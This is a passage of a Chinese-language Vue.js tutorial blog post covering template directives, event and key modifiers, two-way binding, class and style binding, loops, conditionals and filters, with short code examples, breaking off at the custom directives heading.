<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msg: &quot;&lt;h1&gt;wisejay&lt;/h1&gt;&quot;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p v-html=&quot;msg&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>v-bind（缩写：）</p>
<p>绑定属性</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;按钮&quot; v-bind:title=&quot;msg&quot;&gt;//如果不用v-bind直接输出msg</span><br></pre></td></tr></table></figure>

<ul>
<li>v-on（缩写@）</li>
</ul>
<p>绑定函数方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;按钮&quot; v-bind:title=&quot;msg&quot; v-on:click=&quot;show&quot;&gt;</span><br></pre></td></tr></table></figure>

<h1 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h1><ul>
<li>v-on</li>
</ul>
<p>.stop 阻止冒泡</p>
<p>.prevent 阻止默认事件</p>
<p>.capture 捕获模式</p>
<p>.self 事件只在该元素本身触发时才触发</p>
<p>.once 事件只发生一次</p>
<h1 id="按键修饰符"><a href="#按键修饰符" class="headerlink" title="按键修饰符"></a>按键修饰符</h1><ul>
<li>.enter</li>
<li>.tab</li>
<li>.delete (捕获 “删除” 和 “退格” 键)</li>
<li>.esc</li>
<li>.space</li>
<li>.up</li>
<li>.down</li>
<li>.left</li>
<li>.right</li>
<li>.ctrl</li>
<li>.alt</li>
<li>.shift</li>
<li>.meta</li>
<li>自定义全局按键修饰符</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.config.keyCodes.f2 = 113</span><br></pre></td></tr></table></figure>

<h1 id="双向数据绑定"><a href="#双向数据绑定" class="headerlink" title="双向数据绑定"></a>双向数据绑定</h1><ul>
<li>v-modle</li>
</ul>
<p>只能应用在表单元素中(input、checkbox等等)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;input v-model=&quot;message&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">	</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: &apos;wisejay&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="使用式样"><a href="#使用式样" class="headerlink" title="使用式样"></a>使用式样</h1><ul>
<li><p>class 属性绑定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!设置一个对象，动态的切换 class&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.active &#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height: 100px;</span><br><span class="line">	background: green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div v-bind:class=&quot;&#123; active: isActive &#125;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    isActive: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!传入更多属性用来动态切换多个 class&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.active &#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height: 100px;</span><br><span class="line">	background: green;</span><br><span class="line">&#125;</span><br><span class="line">.text-danger &#123;</span><br><span class="line">	background: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;static&quot;</span><br><span class="line">     v-bind:class=&quot;&#123; active: isActive, &apos;text-danger&apos;: hasError &#125;&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    isActive: true,</span><br><span class="line">	hasError: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!直接绑定数据里的一个对象&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.active &#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height: 100px;</span><br><span class="line">	background: green;</span><br><span class="line">&#125;</span><br><span class="line">.text-danger &#123;</span><br><span class="line">	background: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div v-bind:class=&quot;classObject&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    classObject: &#123;</span><br><span class="line">      active: true,</span><br><span class="line">      &apos;text-danger&apos;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>数组语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!加引号就是直接应用该属性，不加引号就是调用对象&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.text-danger &#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height: 100px;</span><br><span class="line">	background: red;</span><br><span class="line">&#125;</span><br><span class="line">.active &#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height: 100px;</span><br><span class="line">	background: green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;div v-bind:class=&quot;[&apos;thin&apos;,activeClass, errorClass]&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    activeClass: &apos;active&apos;,</span><br><span class="line">    errorClass: &apos;text-danger&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p> 三元表达式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.text-danger &#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height: 100px;</span><br><span class="line">	background: red;</span><br><span class="line">&#125;</span><br><span class="line">.active &#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height: 100px;</span><br><span class="line">	background: green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;div v-bind:class=&quot;[errorClass ,isActive ? activeClass : &apos;&apos;]&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    isActive: true,</span><br><span class="line">	activeClass: &apos;active&apos;,</span><br><span class="line">    errorClass: &apos;text-danger&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>内联样式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!直接设置样式&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;div v-bind:style=&quot;&#123; color: activeColor, fontSize: fontSize + &apos;px&apos; &#125;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    activeColor: &apos;green&apos;,</span><br><span class="line">	fontSize: 30</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!直接绑定到一个样式对象&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div v-bind:style=&quot;styleObject&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    styleObject: &#123;</span><br><span class="line">      color: &apos;green&apos;,</span><br><span class="line">      fontSize: &apos;30px&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!多个样式对象应用到一个元素上&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div v-bind:style=&quot;[baseStyles, overridingStyles]&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    baseStyles: &#123;</span><br><span class="line">      color: &apos;green&apos;,</span><br><span class="line">      fontSize: &apos;30px&apos;</span><br><span class="line">    &#125;,</span><br><span class="line">	overridingStyles: &#123;</span><br><span class="line">      &apos;font-weight&apos;: &apos;bold&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><p>  v-for 指令需要以 <strong>site in sites</strong> 形式的特殊语法， sites 是源数据数组并且 site 是数组元素迭代的别名</p>
<ul>
<li>迭代数组</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;ol&gt;</span><br><span class="line">     &lt;!index为可选&gt;</span><br><span class="line">    &lt;li v-for=&quot;site,index in sites&quot;&gt;</span><br><span class="line">     第&#123;&#123;index&#125;&#125;项，值是&#123;&#123; site.name &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    sites: [</span><br><span class="line">      &#123; name: &apos;Runoob&apos; &#125;,</span><br><span class="line">      &#123; name: &apos;Google&apos; &#125;,</span><br><span class="line">      &#123; name: &apos;Taobao&apos; &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>迭代对象</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;(value, key, index) in object&quot;&gt;</span><br><span class="line">     &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    object: &#123;</span><br><span class="line">      name: &apos;0&apos;,</span><br><span class="line">      url: &apos;1&apos;,</span><br><span class="line">      slogan: &apos;2！&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>迭代整数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;n in 10&quot;&gt;</span><br><span class="line">     &#123;&#123; n &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>  v-if:每次都删除和创建元素</p>
<p>  v-show:只是修改了display的属性</p>
<ul>
<li>v-if</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;p v-if=&quot;seen&quot;&gt;现在你看到我了&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    seen: true,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>v-else</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div v-if=&quot;Math.random() &gt; 0.5&quot;&gt;</span><br><span class="line">      Sorry</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div v-else&gt;</span><br><span class="line">      Not sorry</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>v-if-else</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div v-if=&quot;type === &apos;A&apos;&quot;&gt;</span><br><span class="line">      A</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div v-else-if=&quot;type === &apos;B&apos;&quot;&gt;</span><br><span class="line">	  B</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div v-else-if=&quot;type === &apos;C&apos;&quot;&gt;</span><br><span class="line">	  C</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div v-else&gt;</span><br><span class="line">	  Not A/B/C</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">	</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    type: &apos;B&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>v-show</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    ok: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><h2 id="基本过滤"><a href="#基本过滤" class="headerlink" title="基本过滤"></a>基本过滤</h2><p>  可以追加多个过滤器用|来调用如：&lt;!–￼78–&gt;</p>
<p>  前面过滤出来的数据会依次传下去过滤</p>
<ul>
<li><p>无参型</p>
<p>将msg中的o替换成e</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; msg | msgFormat&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.filter(&apos;msgFormat&apos;,function(msg) &#123;</span><br><span class="line">        return msg.replace(&apos;o&apos;,&apos;e&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">	new Vue(&#123;</span><br><span class="line">        el:&apos;#app&apos;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            msg:&quot;hello&quot;</span><br><span class="line">        &#125;, </span><br><span class="line">        methods:&#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>有参型</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; msg | msgFormat(&quot;e&quot;)&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.filter(&apos;msgFormat&apos;,function(msg,arg) &#123;</span><br><span class="line">        return msg.replace(&apos;o&apos;,arg)</span><br><span class="line">    &#125;)</span><br><span class="line">	new Vue(&#123;</span><br><span class="line">        el:&apos;#app&apos;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            msg:&quot;hello&quot;</span><br><span class="line">        &#125;, </span><br><span class="line">        methods:&#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="全局与局部过滤器"><a href="#全局与局部过滤器" class="headerlink" title="全局与局部过滤器"></a>全局与局部过滤器</h2><ul>
<li>全局</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.filter(&apos;msgFormat&apos;,function(msg) &#123;</span><br><span class="line">        return msg.replace(&apos;o&apos;,&apos;e&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">	new Vue(&#123;</span><br><span class="line">        el:&apos;#app&apos;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            msg:&quot;hello&quot;</span><br><span class="line">        &#125;, </span><br><span class="line">        methods:&#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>局部</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	new Vue(&#123;</span><br><span class="line">        el:&apos;#app&apos;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            msg:&quot;hello&quot;</span><br><span class="line">        &#125;, </span><br><span class="line">        methods:&#123;&#125;,</span><br><span class="line">        filters:&#123;</span><br><span class="line">            msgFormat: function (msg)&#123;</span><br><span class="line">                return msg.replace(&apos;o&apos;,&apos;e&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><h2 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h2><ul>
<li>全局</li>
</ul>
